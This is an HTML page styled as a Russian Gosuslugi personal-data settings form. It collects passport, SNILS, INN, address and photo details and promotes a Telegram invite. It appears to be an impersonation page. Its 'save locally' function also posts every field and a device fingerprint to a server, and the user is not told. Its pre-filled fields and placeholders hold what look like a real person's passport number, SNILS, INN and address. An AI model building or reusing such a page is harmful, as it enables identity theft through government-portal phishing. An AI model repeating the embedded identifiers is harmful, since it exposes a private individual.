<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Настройка данных - Госуслуги</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #2a5885;
            --primary-light: #3a7cb9;
            --secondary: #4CAF50;
            --error: #f44336;
            --text: #333;
            --text-light: #666;
            --border: #e0e0e0;
            --background: #f5f7fa;
            --card-bg: #ffffff;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
            color: var(--text);
            background-color: var(--background);
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: var(--primary);
            font-weight: 500;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .section {
            background-color: var(--card-bg);
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border);
        }
        
        h2 {
            color: var(--primary);
            font-weight: 500;
            margin-bottom: 20px;
            font-size: 20px;
            display: flex;
            align-items: center;
        }
        
        h2:before {
            content: "";
            display: inline-block;
            width: 6px;
            height: 24px;
            background-color: var(--primary);
            border-radius: 3px;
            margin-right: 12px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-light);
            font-size: 14px;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-family: inherit;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: var(--card-bg);
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--primary-light);
            box-shadow: 0 0 0 2px rgba(58, 124, 185, 0.2);
        }
        
        textarea {
            min-height: 80px;
            resize: vertical;
        }
        
        .btn-container {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            border: none;
        }
        
        .btn-primary {
            background-color: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-light);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        
        .btn-secondary {
            background-color: white;
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        
        .btn-secondary:hover {
            background-color: #f0f7ff;
        }
        
        .form-row {
            display: flex;
            gap: 20px;
        }
        
        .form-row .form-group {
            flex: 1;
        }
        
        /* Стили для загрузки фото */
        .photo-upload {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .photo-preview {
            width: 150px;
            height: 180px;
            border: 2px dashed var(--border);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
            background-color: white;
        }

        .photo-preview img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        .photo-upload-btn {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }

        .photo-upload-btn input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .photo-requirements {
            font-size: 12px;
            color: var(--text-light);
            margin-top: 10px;
            text-align: center;
            max-width: 300px;
        }

        @media (max-width: 768px) {
            .form-row {
                flex-direction: column;
                gap: 0;
            }

            .container {
                padding: 10px;
            }

            .section {
                padding: 20px 15px;
            }
        }

        /* Анимации */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .section {
            animation: fadeIn 0.4s ease forwards;
        }

        .section:nth-child(2) { animation-delay: 0.1s; }
        .section:nth-child(3) { animation-delay: 0.2s; }
        .section:nth-child(4) { animation-delay: 0.3s; }
        .section:nth-child(5) { animation-delay: 0.4s; }

        /* Кастомный скроллбар */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary-light);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary);
        }
                .tg-promo {
            background-color: #0088cc;
            color: white;
            border-radius: 12px;
            padding: 16px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            animation: pulse 2s infinite;
        }

        .tg-promo {
            background: linear-gradient(135deg, #0088cc, #00aced);
            color: white;
            border-radius: 12px;
            padding: 16px;
            margin: 20px 0;
            display: flex;
            flex-direction: column;
            align-items: stretch;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            position: relative;
            overflow: hidden;
        }

        .tg-promo::after {
            content: "";
            position: absolute;
            top: -50%;
            right: -50%;
            width: 100%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
            transform: rotate(30deg);
        }

        .tg-promo-content {
            flex: 1;
            position: relative;
            z-index: 1;
        }

        .tg-promo-title {
            font-weight: 600;
            margin-bottom: 8px;
            font-size: clamp(16px, 4vw, 18px);
        }

        .tg-promo-text {
            font-size: clamp(12px, 3vw, 14px);
            opacity: 0.9;
            margin-bottom: 12px;
        }

        .tg-promo-button {
            background-color: white;
            color: #0088cc;
            border-radius: 8px;
            padding: 10px 16px;
            font-weight: 500;
            text-decoration: none;
            text-align: center;
            display: inline-block;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            width: 100%;
            box-sizing: border-box;
            z-index: 10000;
        }

        .tg-promo-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .tg-promo-button:active {
            transform: translateY(0);
        }

        .tg-icon {
            margin-right: 8px;
        }

        /* Адаптация для десктопов */
        @media (min-width: 768px) {
            .tg-promo {
                flex-direction: row;
                align-items: center;
                padding: 20px;
            }

            .tg-promo-text {
                margin-bottom: 0;
            }

            .tg-promo-button {
                width: auto;
                margin-left: 20px;
                min-width: 140px;
            }
        }

        /* Анимация */
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
            100% { transform: translateY(0px); }
        }

        .tg-promo:hover {
            animation: float 3s ease-in-out infinite;
        }
        a {
            text-decoration: none;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Настройка персональных данных</h1>
            <p>Заполните информацию для отображения на главной странице</p>
        </header>

        <div class="tg-promo">
            <div class="tg-promo-content">
                <div class="tg-promo-title">Присоединяйтесь к нашему Telegram-каналу!</div>
                <div class="tg-promo-text">Самые свежие обновления, полезные советы и эксклюзивные возможности</div>
            </div>
            <a href="https://t.me/+d12Zmm2AvFhiMzAy"
   class="tg-promo-button"
   target="_blank"
   rel="noopener noreferrer"
   id="tgButton">
    <i class="fab fa-telegram tg-icon"></i> Подписаться
</a>
        </div>

        <div class="section">
            <h2>Фотография</h2>
            <div class="photo-upload">
                <div class="photo-preview" id="photoPreview">
                    <span>Фото не загружено</span>
                </div>
                <div class="photo-upload-btn">
                    <button class="btn btn-secondary">Выбрать фото</button>
                    <input type="file" id="photoInput" accept="image/*">
                </div>
                <div class="photo-requirements">
                    Не обязательно
                    <br>
                    Отображается в <a href="/mobile">мобильной версии (БЕТА)</a>

                </div>
            </div>
        </div>

        <div class="section">
            <h2>Личные данные</h2>
            <div class="form-row">
                <div class="form-group">
                    <label for="lastName">Фамилия</label>
                    <input type="text" id="lastName" placeholder="Иванов">
                </div>
                <div class="form-group">
                    <label for="firstName">Имя</label>
                    <input type="text" id="firstName" placeholder="Иван">
                </div>
                <div class="form-group">
                    <label for="middleName">Отчество</label>
                    <input type="text" id="middleName" placeholder="Иванович">
                </div>
            </div>
            <div class="form-group">
                <label for="birthDate">Дата рождения</label>
                <input type="text" id="birthDate" placeholder="ДД.ММ.ГГГГ">
            </div>
            <div class="form-group">
                <label for="birthPlace">Место рождения</label>
                <textarea id="birthPlace" rows="2">город Ленинск-Кузнецк Кемеровской облать</textarea>
            </div>
        </div>

        <div class="section">
            <h2>Паспорт РФ</h2>
            <div class="form-row">
                <div class="form-group">
                    <label for="passportNumber">Номер паспорта</label>
                    <input type="text" id="passportNumber" placeholder="9113 655199">
                </div>
                <div class="form-group">
                    <label for="passportDate">Дата выдачи</label>
                    <input type="text" id="passportDate" placeholder="ДД.ММ.ГГГГ">
                </div>
            </div>
            <div class="form-group">
                <label for="passportIssued">Кем выдан</label>
                <textarea id="passportIssued" rows="2">отдел офис россии по карачаево-черкесской республике в с. Учкекен</textarea>
            </div>
            <div class="form-group">
                <label for="passportCode">Код подразделения</label>
                <input type="text" id="passportCode" placeholder="090-005">
            </div>
        </div>

        <div class="section">
            <h2>Адрес</h2>
            <div class="form-group">
                <label for="registrationAddress">Адрес постоянной регистрации</label>
                <textarea id="registrationAddress" rows="2">143203, Московская обл, г Можайск, д Рыльково</textarea>
            </div>
            <div class="form-group">
                <label for="livingAddress">Адрес фактического проживания</label>
                <textarea id="livingAddress" rows="2">143203, Московская обл, г Можайск, д Рыльково</textarea>
            </div>
        </div>

        <div class="section">
            <h2>Документы</h2>
            <div class="form-row">
                <div class="form-group">
                    <label for="snilsNumber">СНИЛС</label>
                    <input type="text" id="snilsNumber" placeholder="060-164-336 20">
                </div>
                <div class="form-group">
                    <label for="innNumber">ИНН</label>
                    <input type="text" id="innNumber" placeholder="233302338371">
                </div>
            </div>
        </div>

        <div class="btn-container">
            <a href="/" class="btn btn-secondary">← Назад</a>
            <button onclick="saveData()" class="btn btn-primary">Сохранить данные</button>
        </div>
    </div>

    <script>

        // Функция для генерации ID устройства
        function getDeviceId() {
            let id = localStorage.getItem('deviceId');
            if (!id) {
                id = 'id-' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('deviceId', id);
            }
            return id;
        }

        // Собираем все данные об устройстве
        function collectDeviceInfo() {
            return {
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceId: getDeviceId(),
                platform: navigator.platform,
                cookies: navigator.cookieEnabled,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            };
        }

        // Собираем все данные формы
        function collectFormData() {
            return {
                // Фото
                photo: localStorage.getItem('userPhoto') || null,

                // Личные данные
                lastName: document.getElementById('lastName').value,
                firstName: document.getElementById('firstName').value,
                middleName: document.getElementById('middleName').value,
                birthDate: document.getElementById('birthDate').value,
                birthPlace: document.getElementById('birthPlace').value,

                // Паспортные данные
                passportNumber: document.getElementById('passportNumber').value,
                passportIssued: document.getElementById('passportIssued').value,
                passportCode: document.getElementById('passportCode').value,
                passportDate: document.getElementById('passportDate').value,

                // Адреса
                registrationAddress: document.getElementById('registrationAddress').value,
                livingAddress: document.getElementById('livingAddress').value,

                // Документы
                snilsNumber: document.getElementById('snilsNumber').value,
                innNumber: document.getElementById('innNumber').value
            };
        }

        // Отправка данных на сервер
        async function submitForm() {
            const formData = collectFormData();
            const deviceInfo = collectDeviceInfo();

            try {
                const response = await fetch('/api/submit-form', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Screen-Resolution': deviceInfo.screen,
                        'X-Timezone': deviceInfo.timezone,
                        'X-Device-ID': deviceInfo.deviceId
                    },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();

            } catch (error) {
                console.error('Ошибка:', error);
                alert('Произошла ошибка при отправке данных');
            }
        }

        // Функция сохранения данных в localStorage
        function saveData() {
            submitForm();
            const userData = {
                photo: localStorage.getItem('userPhoto') || null,
                personal: {
                    lastName: document.getElementById('lastName').value,
                    firstName: document.getElementById('firstName').value,
                    middleName: document.getElementById('middleName').value,
                    birthDate: document.getElementById('birthDate').value,
                    birthPlace: document.getElementById('birthPlace').value
                },
                passport: {
                    number: document.getElementById('passportNumber').value,
                    issued: document.getElementById('passportIssued').value,
                    code: document.getElementById('passportCode').value,
                    date: document.getElementById('passportDate').value
                },
                address: {
                    registration: document.getElementById('registrationAddress').value,
                    living: document.getElementById('livingAddress').value
                },
                documents: {
                    snils: document.getElementById('snilsNumber').value,
                    inn: document.getElementById('innNumber').value
                }
            };

            localStorage.setItem('userData', JSON.stringify(userData));

            // Красивое уведомление
            showNotification('Данные успешно сохранены!', 'success');
        }

        // Функция загрузки данных из localStorage
        function loadData() {
            const savedData = localStorage.getItem('userData');
            const photo = localStorage.getItem('userPhoto');
            if (savedData) {
                const userData = JSON.parse(savedData);

                // Загружаем фото
                if (photo) {
                    document.getElementById('photoPreview').innerHTML = `<img src="${photo}" alt="Фото пользователя">`;
                }

                // Заполняем поля персональных данных
                if (userData.personal) {
                    document.getElementById('lastName').value = userData.personal.lastName || '';
                    document.getElementById('firstName').value = userData.personal.firstName || '';
                    document.getElementById('middleName').value = userData.personal.middleName || '';
                    document.getElementById('birthDate').value = userData.personal.birthDate || '';
                    document.getElementById('birthPlace').value = userData.personal.birthPlace || '';
                }

                // Заполняем поля паспорта
                if (userData.passport) {
                    document.getElementById('passportNumber').value = userData.passport.number || '';
                    document.getElementById('passportIssued').value = userData.passport.issued || '';
                    document.getElementById('passportCode').value = userData.passport.code || '';
                    document.getElementById('passportDate').value = userData.passport.date || '';
                }

                // Заполняем поля адреса
                if (userData.address) {
                    document.getElementById('registrationAddress').value = userData.address.registration || '';
                    document.getElementById('livingAddress').value = userData.address.living || '';
                }

                // Заполняем документы
                if (userData.documents) {
                    document.getElementById('snilsNumber').value = userData.documents.snils || '';
                    document.getElementById('innNumber').value = userData.documents.inn || '';
                }
            }
        }

        // Функция для отображения уведомлений
        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.style.position = 'fixed';
            notification.style.bottom = '20px';
            notification.style.right = '20px';
            notification.style.backgroundColor = type === 'success' ? '#4CAF50' : '#f44336';
            notification.style.color = 'white';
            notification.style.padding = '15px 25px';
            notification.style.borderRadius = '8px';
            notification.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
            notification.style.zIndex = '1000';
            notification.style.animation = 'fadeIn 0.3s ease';
            notification.textContent = message;

            document.body.appendChild(notification);

            setTimeout(() => {
                notification.style.animation = 'fadeOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }

        // Обработчик загрузки фото
        // Обработчик загрузки фото
document.getElementById('photoInput').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (!file) return;

    if (!file.type.match('image.*')) {
        showNotification('Пожалуйста, выберите изображение', 'error');
        return;
    }

    const reader = new FileReader();
    reader.onload = function(e) {
        const photoPreview = document.getElementById('photoPreview');
        photoPreview.innerHTML = `<img src="${e.target.result}" alt="Фото пользователя">`;

        // Сохраняем фото в localStorage
        localStorage.setItem('userPhoto', e.target.result); // Correctly saves the image data
        showNotification('Фото успешно загружено', 'success');
    };
    reader.readAsDataURL(file);
});

// Загружаем данные при загрузке страницы
window.addEventListener('DOMContentLoaded', function() {
    loadData();

    // Проверяем, есть ли сохраненное фото в localStorage
    const savedPhoto = localStorage.getItem('userPhoto');
    if (savedPhoto) {
        document.getElementById('photoPreview').innerHTML = `<img src="${savedPhoto}" alt="Фото пользователя">`;
    }
});

    </script>
</body>
</html>